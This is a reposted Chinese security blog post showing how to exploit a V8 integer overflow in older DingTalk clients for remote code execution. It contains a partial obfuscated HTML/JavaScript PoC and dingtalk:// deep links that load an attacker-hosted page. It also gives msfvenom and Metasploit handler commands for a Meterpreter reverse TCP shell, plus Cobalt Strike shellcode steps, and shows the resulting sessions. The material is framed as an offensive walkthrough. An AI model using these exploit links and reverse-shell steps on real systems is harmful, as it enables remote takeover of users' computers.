> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzg5NTU2NjA1Mw==&mid=2247503251&idx=1&sn=4348ac59de6d6181d46ee70e3fb46e97

#  【攻防实战】实战中的某钉RCE  
原创 平凡安全  平凡安全   2025-06-28 12:00  
  
**「当你深入了解这块土地上的人们时，你会发现，他们的思想，配得上他们所受的苦难。」**  
## 「前言」  
  
网络安全技术学习，承认⾃⼰的弱点不是丑事。只有对原理了然于⼼，才能突破更多的限制。拥有快速学习能力的安全研究员，是不能有短板的，有的只能是大量的标准板和几块长板。知识⾯，决定看到的攻击⾯有多⼴；知识链，决定发动的杀伤链有多深。  
## 「零、漏洞原理」  
  
利用了Chromium v8引擎整数溢出漏洞（是V8优化编译器Turbofan在SimplifiedLowering阶段产生的一个整数溢出漏洞），V8是Chromium内核中的JavaScript引擎，负责对JavaScript代码进行解释优化与执行。  
## 「一、影响版本」  
  
经测试需要钉钉版本< 6.3.25-Release.2149108  
## 「二、poc」  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpw323CyHsGP3dchTrQZN6a7JrQfQbKaCiayrctuc7ibgyTWHyUCrAeibhPJE0qhfkCkUGeiaOKREpkO3g/640?wx_fmt=png&from=appmsg "")  

```
<html>

<body>
    <h1> test </h1>
    <script>
/*
* var _0x1b17=['KELCi8OxLg==','ZE/CpWvCpDkcPA==','E8Kjw51bQ8O+Klk0w4vCsw==','w5lnw5Ipwr12RsOCw7B/J8OEw4E=','QMOtNcO9w77Dv8OIwp3DmQ7CksOdOA==','X8KgbcK0wqXCuw==','DjfCg8KK','OsO3fsOwwojCq0YpMw==','RMKWBMKHW3PCqcKjTwgMaw==','O8KCw5PCoMOpwo0=','e0rDgMO8wqNndsOM','wphVw6Zhw7wWwrLDg8K1','IibCvsKFwqXCqMKAw6w4NDgs','PcO6Z8O2w4LCp20tMWrDhxMZRSLCmSvDuTjCnk8=','GcOiPsKX','G8K7w6vDpXNGIcOwLnXDu8K9BkI=','w7MXFMKhw78WwpYqwqVVFcKR','GMK/w7vDpnVIJ8Or','ank7Wy4jw44=','HTfCicKbGsKEaysJwqTDux1L','GS3CqsKEwqjCp8KRw5Y=','GcOmcktVwrw=','w50aKsKuwq9cdMO4wpTDqyo5GBQ=','IybCrcKgwrvCpsKGw5w8Pyc5AcOn','NhbCuwM=','wqFcbEfDmMOMw6LCkl9ywqwDwocc','wqfChMOfw4jDjsKzwozCn8Oqwok=','w4tcwrED','cCvCsMOQw7g=','w6pdw4k=','wqJyw4vCmMO1wrTCj8OSwqnDnSY=','WsKcBA==','wrV8w4vCjcOlwrDDgcKXwqTDlQ==','XsKWD8KeWA==','H8O+KcKHHGPDiUQ=','w73Ci8OFw60=','Wy7Csg==','e0TDocOvwrR6IsKLQArDsw==','AzvCjQIS','VMOxw6/Ciw==','fEDDp8OdwrhgbMKYGw==','PCzCvg==','w5QHwrPDlGRLNQHDpHwqa8OJR3hiwpwyMBJzJR8=','ZMO8ecOcd8Oow7M6wq1O','w417wqvDl3BuwooiwrnCpDBZwoNw','fHtRGA==','Y24s','w4VWwrsdKQ8=','HsKCOC4RwrQ=','w4AJwrLDi05SLxfDtEI0esODaA==','L2kiFG0=','H8O+I8KdBmc=','w6RcwrEPMQI=','FTvDq8O+w7Ucax4=','FsKfJS4Rwrky','wpBAw5zCjMO1','HsO+w4PDgsKUWw==','EcKxwoXDjcOLCQ==','PkrCncOEOMOww7fCrlDCgMOJesOdAQ==','F8K+w49bSQ==','w4dew5rDmMKg','wp52wrbCpzM=','wqIjw4xDwqA=','cMKIw5vCncKdJV/CoMK7RA==','CiTCnsKdC8KV','fXtHE8ObSBZqwp5G','Fjd1EMOqw57CgcOd','ZsOje8OLbMO8w4Q3wqAQwqU=','C8Kxw63Dh3RZIcO6Pj4=','w4rDj8O/','ZU/Ctg==','BcKyw55TcsO8HF8+w7jCtsKtEgo7w5LCigQ8','w4ZdwrkVPAM='];(function(_0x4285cf,_0x1b1736){var _0x1368bb=function(_0x5a17b5){while(--_0x5a17b5){_0x4285cf['push'](_0x4285cf['shift']());}};_0x1368bb(++_0x1b1736);}
*/
</script>
</body>

</html>

```


```
test
0x0000000000000000

test: 0000000000000NaN

wasm_func_addr is: 0000000000000NaN

shared_info_addr is: 00000000000000-1

export_function_data_addr is: 00000000000000-1

wasm_instance_addr is: 00000000000000-1

rwx addr is: 0000000000000000

```

## 「三、触发方式」  

```
dingtalk://dingtalkclient/page/link?url=x.x.x.x/calc.html&pc_slide=true

```

### 「漏洞证明」  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpw323CyHsGP3dchTrQZN6a7X4G0NfOtxaYvbOJ4ebThvZdtothric47HpfsAicIUhegIiaZyavSmUtsg/640?wx_fmt=png&from=appmsg "")  
## 「四、msf反弹shell」  
### 「msf 生成shellcode」  

```
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxx -e x86/shikata_ga_nai -f csharp

```

  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpw323CyHsGP3dchTrQZN6a7WtUPZKhHsGAdibbq3C4I66LMictqum0HfCIBhD3CULkDlueiadMHZfoYQ/640?wx_fmt=png&from=appmsg "")  
### 「msf开启监听」  

```
use exploits/multi/handler
set lhost x.x.x.x
set lport xxx
run

```

### 「将生成的shellcode替换原shellcode」  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpw323CyHsGP3dchTrQZN6a7f8VyiaicP2rxnj8afY8KibsnDxkmDp4w73vycasgoOshK6XhlHnlubcOQ/640?wx_fmt=png&from=appmsg "")  
### 「需要替换的位置为」  

```
var shellcode=new Uint8Array()

```

### 「poc」  

```
dingtalk://dingtalkclient/page/link?url=http://x.x.x.x/msf.html&pc_slide=true

```

### 「成功上线msf」  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpw323CyHsGP3dchTrQZN6a7xYLDr8vbAKWAPgTvcC7BeCV9qib7d7gly5JKQd5iaHFCVZbfyVZ5KXbQ/640?wx_fmt=png&from=appmsg "")  
## 「五、cs反弹shell」  
### 「cs生成c#的shellcode」  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpw323CyHsGP3dchTrQZN6a740VJY5Xc6icDF0cibdAB2KQeUXCNgm8YHkuoRWNMG6hlBKQkBU4ONz3A/640?wx_fmt=png&from=appmsg "")  
  
不要勾选x64  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpw323CyHsGP3dchTrQZN6a7L0ePU8I1mMBweKuQTaeCatzIdKNfBKPFJOHf3jOEX8z9xIk84b2ISw/640?wx_fmt=png&from=appmsg "")  
  
将生成的shellcode替换原shellcode  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpw323CyHsGP3dchTrQZN6a7rVAhNmic0B7SQDRxLpcr0nvjSe5eODnIYS8132ydY6Ccjg0TefZsYPA/640?wx_fmt=png&from=appmsg "")  
### 「需要替换的位置为」  

```
var shellcode=new Uint8Array()

```

### 「poc」  

```
dingtalk://dingtalkclient/page/link?url=http://x.x.x.x/cs.html&pc_slide=true

```

### 「成功上线cs」  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpw323CyHsGP3dchTrQZN6a7r3icxLxg1uaRkotdrHmkLfZTPUbCLx0iaBw5iaSDECdjKBXsIV7EZzYuA/640?wx_fmt=png&from=appmsg "")  
## 「网络安全感悟」  
  
网络安全是一个长期的过程，因为网络安全没有终点，不管是网络安全企业，还是在网络安全行业各种不同方向的从业人员，不管你选择哪个方向，只有在这条路上坚持不懈，才能在这条路上走的更远，走的更好，不然你肯定走不远，迟早会转行或者被淘汰，把时间全浪费掉。如果你觉得自己是真的热爱网络安全这个行业，坚持走下去就可以了，不用去管别人，现在就是一个大浪淘金的时代，淘下去的是沙子，留下来的才是金子，正所谓，千淘万漉虽辛苦，吹尽狂沙始到金，网络安全的路还很长，一生只做一件事，坚持做好一件事！  
## 「攻防交流群」  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/v94hWOZcBpw323CyHsGP3dchTrQZN6a7xU7FNJLkPxtbYvdaw8VxEVOiaPRys7OpaJ68zaOoouJm2IhicDXBBOmw/640?wx_fmt=jpeg&from=appmsg "")  
## 「声明」  
  
文笔生疏，措辞浅薄，敬请各位大佬不吝赐教，万分感谢。  
  
免责声明：由于传播或利用此文所提供的信息、技术或方法而造成的任何直接或间接的后果及损失，均由使用者本人负责， 文章作者不为此承担任何责任。  
  
转载声明：平凡安全 拥有对此文章的修改和解释权，如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章的内容，不得以任何方式将其用于商业目的。  
  
